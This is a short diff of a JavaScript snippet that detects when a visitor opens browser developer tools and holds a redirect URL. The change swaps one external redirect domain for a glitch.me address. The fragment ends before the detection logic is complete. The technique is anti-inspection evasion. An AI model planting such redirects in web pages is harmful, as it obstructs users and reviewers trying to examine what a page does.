@@ -1,6 +1,6 @@
 (function() {
     let devToolsOpened = false;
-    const redirectUrl = "https://ezstat.ru/tomoneko";
+    const redirectUrl = "https://reminiscent-truthful-leptoceratops.glitch.me/";
     const threshold = 160; // 開発者ツール検出値
 
     function checkDevTools() {
